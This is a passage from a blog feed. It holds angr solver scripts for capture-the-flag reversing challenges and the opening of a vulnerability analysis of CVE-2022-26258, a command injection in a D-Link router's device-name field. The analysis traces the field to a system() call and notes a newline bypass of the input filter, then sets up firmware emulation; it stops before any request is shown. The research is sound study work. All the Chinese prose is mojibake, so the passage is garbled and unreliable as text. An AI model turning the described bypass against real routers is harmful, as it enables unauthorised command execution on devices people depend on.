builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span>    solution1 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span>    solution2 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span>    solution <span class="token operator">=</span> solution0 <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> solution1 <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> solution2  <span class="token comment"># :string</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøêË°åÂêéÂæóÂà∞ÁªìÊûúÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427145237549.png" alt="image-20220427145237549"></p><h1 id="Part-3-angr-symbolic-stack"><a href="#Part-3-angr-symbolic-stack" class="headerlink" title="Part 3 angr symbolic stack"></a>Part 3 angr symbolic stack</h1><p>Âú® Part 2 ÁöÑ‰æãÂ≠ê‰∏≠Ôºå‰∏∫‰∫ÜÂõæÊñπ‰æøÔºåÊ≤°ÊúâÊûÑÈÄ†Ê†àÁöÑÂÜÖÂÆπÔºåËÄåÊòØË∂äËøáËæìÂÖ•ÂáΩÊï∞Áõ¥Êé•ÊûÑÈÄ†ÂØÑÂ≠òÂô®ÂÜÖÂÆπÔºå‰ΩÜÊúâÊó∂ÂÄôÊàë‰ª¨‰∏çÂæó‰∏çÂéªÊûÑÈÄ†Ê†àÁöÑÂÜÖÂÆπ„ÄÇ</p><p>IDA ÊâìÂºÄ 04_angr_symbolic_stack ‰∫åËøõÂà∂Êñá‰ª∂Ôºå<code>scanf</code> ÂáΩÊï∞ÂÆåÊàêÂêéÁõ¥Êé•ÂØπËæìÂÖ•ÂÜÖÂÆπËøõË°åÊìç‰ΩúÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427151637284.png" alt="image-20220427151637284"></p><p>‰ªéÊ±áÁºñ‰ª£Á†ÅÊù•ÁúãÔºå<code>scanf</code> ÂáΩÊï∞ÊòØÂ§ñÂπ≥Ê†àÔºåÂ∞Ü‰∏§‰∏™ËæìÂÖ•ÂÜÖÂÆπÊîæÂÖ•‰∫Ü EBP-0x10 Âíå EBP-0xC ÁöÑ‰ΩçÁΩÆÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427152733646.png" alt="image-20220427152733646"></p><p>ÈÇ£‰πàÂèØ‰ª•‰ªé 0x08048697 Âú∞ÂùÄÂºÄÂßãÁªïËøá <code>scanf</code> ÂáΩÊï∞ÔºåÁÑ∂ÂêéÊûÑÈÄ†Ëøô‰∏§‰∏™Ê†à‰∏äÁöÑÂÜÖÂÆπ„ÄÇÂÖ≥ÈîÆÂú®‰∫éÂ¶Ç‰ΩïÊûÑÈÄ†Ëøô‰∏§‰∏™ÂÜÖÂÆπÂë¢ÔºüÊàë‰ª¨ÂèØ‰ª•Âà©Áî® EBP ÂØÑÂ≠òÂô®ÔºåÂõ†‰∏∫ EBP Âú®ÂáΩÊï∞ËøîÂõû‰πãÂâçÊòØ‰∏ç‰ºöÂèòÂä®ÁöÑÔºåÂπ∂‰∏îÂú®ÂáΩÊï∞ÂºÄÂßãÁöÑÊó∂ÂÄôÂ∞±ÊâßË°å‰∫Ü <code>MOV EBP, ESP</code>ÔºåÈÇ£‰πàÂú®Ê≠§Âü∫Á°Ä‰∏äÔºåÁÆóÂá∫ ESP Âú®Êàë‰ª¨ÊåáÂÆöÁöÑËµ∑ÂßãÂú∞ÂùÄÂâçÂèòÂåñÂ§öÂ∞ë‰∏™Â≠óËäÇÂ∞±ÂèØ‰ª•‰∫Ü„ÄÇ</p><p>Áõ¥Êé•‰∏ä‰ª£Á†ÅÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">"./04_angr_symbolic_stack"</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>    start_address <span class="token operator">=</span> <span class="token number">0x08048697</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebp <span class="token operator">=</span> initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>  password1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>    padding_length_in_bytes <span class="token operator">=</span> <span class="token number">8</span>  <span class="token comment"># :integer</span>  initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">-=</span> padding_length_in_bytes    initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>password0<span class="token punctuation">)</span>  <span class="token comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span>  initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>password1<span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution0 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>se<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">)</span>    solution1 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>se<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">)</span>    solution <span class="token operator">=</span> solution0 <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> solution1    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÊâßË°åÂæóÂà∞ÁªìÊûúÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427154948561.png" alt="image-20220427154948561"></p>]]></content>
      
      
      
        <tags>
            
            <tag> symbolic execution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-26258 ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û</title>
      <link href="/2022/04/25/cve-2022-26258-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2022/04/25/cve-2022-26258-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="ÂàÜÊûêÂõ∫‰ª∂ÂíåÊºèÊ¥û"><a href="#ÂàÜÊûêÂõ∫‰ª∂ÂíåÊºèÊ¥û" class="headerlink" title="ÂàÜÊûêÂõ∫‰ª∂ÂíåÊºèÊ¥û"></a>ÂàÜÊûêÂõ∫‰ª∂ÂíåÊºèÊ¥û</h1><p>D-Link DIR-820LË∑ØÁî±Âô®Âõ∫‰ª∂ÁâàÊú¨1.05B03Â≠òÂú®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåCVEÁºñÂè∑CVE-2022-26258ÔºåÈÄöËøáCVEÁΩëÁ´ôÊü•Áúã‰ø°ÊÅØÔºåÂæóÁü•ÊºèÊ¥ûÂú® &#x2F;lan.asp È°µÈù¢‰∏≠ÁöÑËÆæÂ§áÂêçÁß∞ÂèÇÊï∞Âá∫‰∫ÜÈóÆÈ¢ò„ÄÇ‰ª•‰∏ãÊòØCVEÁöÑÊèèËø∞‰ø°ÊÅØÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141131392.png" alt="image-20220425141131392">‰ΩøÁî®binwalkËß£ÂåÖÊó∂Âπ∂Êú™ÂèëÁé∞Âä†ÂØÜÔºåÁõ¥Êé•ÂæóÂà∞‰∫Üsquashfs-root Êñá‰ª∂Á≥ªÁªüÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141224791.png" alt="image-20220425141224791"></p><p>ÊâæÂà∞ lan.asp Êñá‰ª∂ÔºåÊêúÁ¥¢‚Äúdevice‚ÄùÂíå‚Äúname‚ÄùÁõ∏ÂÖ≥ÂÖ≥ÈîÆËØçÔºåÂèëÁé∞ÊúâÂ§öÂ§ÑË∞ÉÁî®Ôºö</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">onPageLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token function">get_by_id</span><span class="token punctuation">(</span><span class="token string">"lan_device_name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> lanCfg<span class="token punctuation">.</span>lanDeviceName<span class="token punctuation">;</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token operator">...</span><span class="token keyword">function</span> <span class="token function">send_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token keyword">var</span> lan_device_name <span class="token operator">=</span> <span class="token function">get_by_id</span><span class="token punctuation">(</span><span class="token string">"lan_device_name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token operator">...</span><span class="token keyword">function</span> <span class="token function">copyDataToDataModelFormat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span>paramStr <span class="token operator">+=</span> <span class="token string">'&amp;lanHostCfg_DeviceName_1.1.1.0='</span> <span class="token operator">+</span> <span class="token function">get_by_id</span><span class="token punctuation">(</span><span class="token string">"lan_device_name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token operator">...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span><span class="token plain-text"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>duple<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token plain-text">show_words('DEVICE_NAME')</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token plain-text">:</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>340<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lan_device_name<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lan_device_name<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>15<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token plain-text"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token plain-text">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂÆ°ËÆ°‰ª£Á†ÅÔºåÂèëÁé∞<code>lan_device_name</code>‰Ωú‰∏∫ËØ∑Ê±ÇÂèÇÊï∞ÔºåÊãºÊé•Âà∞<code>paramStr</code>‰∏≠ÔºåËøôÈáåÂ∫îËØ•ÊòØ‰∏Ä‰∏™POSTËØ∑Ê±ÇÔºåÁÑ∂ÂêéÂ∞ÜÂÜÖÂÆπÊèê‰∫§Âà∞‰∫Ü<code>get_set.ccp</code> ÁöÑURL‰∏≠ÔºåÔºö</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">send_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token keyword">if</span><span class="token punctuation">(</span>submit_button_flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>submit_button_flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">/*var restoreStrfor(var i=0; i&lt;25; i++)&#123;&#125;*/</span><span class="token function">deleteRedundentDatamodel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> submitObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ccpObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> submitParam <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"get_set.ccp"</span><span class="token punctuation">,</span><span class="token literal-property property">arg</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Âú®Êñá‰ª∂Á≥ªÁªü‰∏≠‰ΩøÁî®<code>grep -r get_set .</code> Êü•ÊâæËøô‰∏™URLÁöÑÂºïÁî®ÔºåÂπ∂Ê≤°ÊúâÂèëÁé∞Âêç‰∏∫‚Äúget_set.ccp‚ÄùÁöÑÊñá‰ª∂Ôºå‰ΩÜÊúâËÆ∏Â§öaspÊñá‰ª∂ÈÉΩ‰ΩøÁî®‰∫ÜËøô‰∏™URLÔºåÂπ∂‰∏îÊúâÂõõ‰∏™‰∫åËøõÂà∂Êñá‰ª∂‰∏≠ÂåπÈÖçÂà∞‰∫ÜËøô‰∏™URLÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141254823.png" alt="image-20220425141254823"></p><p>Êó¢ÁÑ∂Ê≤°Êúâ‚Äúget_set.ccp‚ÄùÊñá‰ª∂ÔºåÈÇ£‰πàÂèØËÉΩÊòØËøô‰∏™URL‰ºö‰∫§ÁªôÂêéÁ´ØÂ§ÑÁêÜÔºåÂ§ÑÁêÜÂ•Ω‰πãÂêéËøîÂõûÁªôÁî®Êà∑ÁªìÊûú„ÄÇÊàë‰ª¨‰æùÊ¨°ÂàÜÊûêËøôÂõõ‰∏™‰∫åËøõÂà∂Êñá‰ª∂ÔºåÂú®Êñá‰ª∂‰∏≠ÊêúÁ¥¢Â≠óÁ¨¶‰∏≤‚Äùget_set‚ÄùÔºåÁªìÊûúflash„ÄÅsmbd„ÄÅlibc‰∏çÊòØÂæàÂåπÈÖçÔºåÂèØËÉΩÊÄßËæÉ‰ΩéÔºåËÄåncc2ÁöÑÂÜÖÂÆπÂæàÂåπÈÖçÔºåÂÆÉ‰∏çÂÖâÊúâÂ≠óÁ¨¶‰∏≤ÔºåËøòÊúâÁõ∏ÂÖ≥ÂáΩÊï∞Ôºåncc2ÁªìÊûúÂ¶Ç‰∏ãÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141320141.png" alt="image-20220425141320141"></p><p>Êé•‰∏ãÊù•ÂØπncc2ËøõË°åÈÄÜÂêëÔºåÊêúÁ¥¢<code>system</code>Á≠âÂëΩ‰ª§ÊâßË°åÂáΩÊï∞ÔºåÂèëÁé∞ÂÖ≥ÈîÆÈÄªËæëÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141332645.png" alt="image-20220425141332645"></p><p>ËøôÈáåÂ∞Üv4ÁöÑÂÄºÊãºÊé•Âà∞Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÈáåÔºåÁÑ∂ÂêéÊï¥‰∏™Â≠óÁ¨¶‰∏≤‰º†Áªô<code>system</code>ÔºåÁõÆÂâçÁúãÊù•Âπ∂Êú™ÂØπv4ËøõË°åÊ£ÄÊü•ÔºåÂæàÊúâÂèØËÉΩÊòØÂëΩ‰ª§Ê≥®ÂÖ•ÁÇπ„ÄÇ</p><p>v4ÊòØ<code>getObj</code>ÂáΩÊï∞ÁöÑËøîÂõûÂÄºObjÔºåÈúÄË¶ÅÁªïËøá<code>hasInjectionString</code>ÁöÑÂà§Êñ≠ÊâçËÉΩÂà∞ËææÂëΩ‰ª§Ê≥®ÂÖ•ÁÇπÔºåÁé∞Âú®ÈúÄË¶ÅÊâæÂà∞<code>hasInjectionString</code> ÂáΩÊï∞Âú®Âì™‰∏™Êñá‰ª∂‰∏≠ÔºåÂêåÊ†∑‰ΩøÁî®<code>grep -r</code> ÂëΩ‰ª§Ôºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141346118.png" alt="image-20220425141346118"></p><p>ËøôÈáåÊâæÂà∞‰∏Ä‰∏™libcÊñá‰ª∂ÔºåÁî®IDAÊâìÂºÄÔºåÁÑ∂ÂêéÂàÜÊûêÊ≠§ÂáΩÊï∞ÔºåÂèëÁé∞ÂÆÉÊòØ‰∏Ä‰∏™ËøáÊª§ÂáΩÊï∞ÔºåÁî®‰∫éÂà§Êñ≠ÊòØÂê¶ÊúâÈùûÊ≥ïÂ≠óÁ¨¶Ôºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141357805.png" alt="image-20220425141357805"></p><p>‰ΩÜÊòØËøôÈáåÂè™ÊòØ‰∏Ä‰∫õÂü∫Êú¨ÁöÑËøáÊª§ËßÑÂàôÔºåÊ≤°ÊúâËøáÊª§ÂÜíÂè∑ÂíåÊç¢Ë°åÁ¨¶ÔºåÂèØ‰ª•‰ΩøÁî®‚Äú\n‚ÄùÊù•ÁªïËøáÔºåÊúÄÁªàËææÂà∞ÂëΩ‰ª§Ê≥®ÂÖ•ÁöÑÊïàÊûú„ÄÇÁé∞Âú®Ë¶ÅÈ™åËØÅÊºèÊ¥ûÊòØÂê¶Â≠òÂú®ÔºåÈúÄË¶ÅËøõË°åÂõ∫‰ª∂‰ªøÁúü„ÄÇËØï‰∫Ü‰∏Ä‰∏ãFrimAEÂèØ‰ª•‰ªøÁúüÔºåËøôÊ†∑Â∞±‰∏çÈúÄË¶ÅÊâãÂä®ÂéªÊ®°Êãü‰∫ÜÔºåÈÅøÂÖç‰∫ÜÂæàÂ§öÈ∫ªÁÉ¶„ÄÇ</p><h1 id="ÊºèÊ¥ûÂ§çÁé∞"><a href="#ÊºèÊ¥ûÂ§çÁé∞" class="headerlink" title="ÊºèÊ¥ûÂ§çÁé∞"></a>ÊºèÊ¥ûÂ§çÁé∞</h1><p>È¶ñÂÖà‰∏ãËΩΩFirmAEÔºåÁÑ∂ÂêéÊåâÁÖßÂÆòÊñπÊñáÊ°£ÁªôÂá∫ÁöÑÂÆâË£ÖÊïôÁ®ãÊääÁéØÂ¢ÉÂÆâË£ÖÂ•ΩÔºö</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone --recursive <span class="token operator">&lt;</span>https://github.com/pr0v3rbs/FirmAE<span class="token operator">></span><span class="token function">sudo</span> ./download.sh<span class="token function">sudo</span> ./install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Âú®downloadÁöÑÊó∂ÂÄôÈÄüÂ∫¶ÈùûÂ∏∏ÊÖ¢ÔºåÁîöËá≥Âá∫Áé∞ËøûÊé•Êñ≠ÊéâÁöÑÊÉÖÂÜµÔºåÂèØ‰ª•Êü•Áúãdownload.shËÑöÊú¨ÔºåÁÑ∂ÂêéÊê≠‰∏äÊ¢ØÂ≠êÊâãÂä®‰∏ãËΩΩÂà∞binariesÊñá‰ª∂Â§π‰∏ãÔºö</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function-name function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token function">wget</span> -N --continue -P./binaries/ <span class="token variable">$*</span><span class="token punctuation">&#125;</span><span class="token builtin class-name">echo</span> <span class="token string">"Downloading binaries..."</span><span class="token builtin class-name">echo</span> <span class="token string">"Downloading kernel 2.6 (MIPS)..."</span>download <span class="token operator">&lt;</span>https://github.com/pr0v3rbs/FirmAE_kernel-v2.6/releases/download/v1.0/vmlinux.mipsel.<span class="token operator"><span class="token file-descriptor important">2</span>></span>download <span class="token operator">&lt;</span>https://github.com/pr0v3rbs/FirmAE_kernel-v2.6/releases/download/v1.0/vmlinux.mipseb.<span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>‰∏ãËΩΩÂ•Ω‰πãÂêéËøêË°å‰ªøÁúüÂëΩ‰ª§Ôºö</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ./init.sh<span class="token function">sudo</span> ./run.sh -a <span class="token operator">&lt;</span>brand<span class="token operator">></span> <span class="token operator">&lt;</span>firmware<span class="token operator">></span><span class="token function">sudo</span> ./run.sh -r <span class="token operator">&lt;</span>brand<span class="token operator">></span> <span class="token operator">&lt;</span>firmware<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>-a</code> ËøôÊù°ÂëΩ‰ª§ÊòØËß£ÊûêÂõ∫‰ª∂Ôºå<code>brand</code>ÂèÇÊï∞ÊòØ‰∏Ä‰∏™Ëá™ÂÆö‰πâÁöÑÊ†áËØÜÁ¨¶ÔºåÁÑ∂ÂêéË∑ü‰∏äfirmware.binÊñá‰ª∂Ôºå<code>-r</code> ËøôÊù°ÂëΩ‰ª§Â∞±ÊòØËøêË°å‰ªøÁúü‰∫Ü„ÄÇ‰ªøÁúüÊàêÂäüÂèØ‰ª•ÁúãÂà∞Â¶Ç‰∏ã‰ø°ÊÅØÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141412340.png" alt="image-20220425141412340"></p><p>ÁÑ∂ÂêéÂú®ÊµèËßàÂô®ËÆøÈóÆ192.168.0.1ÔºåÂèØ‰ª•ËÆøÈóÆÊàêÂäüÔºåËøôÈáåË¶ÅÊ±ÇÁôªÂΩïÔºåÈªòËÆ§ÂØÜÁ†Å‰∏∫Á©∫Ôºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141423322.png" alt="image-20220425141423322"></p><p>Ê†πÊçÆ‰πãÂâçÁöÑÂàÜÊûêÁªìÊûúÔºåËÆøÈóÆlan.aspÔºåÁúãÂà∞È°µÈù¢Á°ÆÂÆûÂÉèÈ¢ÑÊµãÁöÑÈÇ£Ê†∑POSTÊèê‰∫§Ë°®ÂçïÂà∞get_set.ccpÁöÑURL„ÄÇËøôÈáåÊµãËØï‰øÆÊîπDevice NameÁÑ∂Âêé‰ΩøÁî®burpsuiteÊäìÂåÖÁúãÁúãÂèÇÊï∞ÊûÑÊàêÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141433485.png" 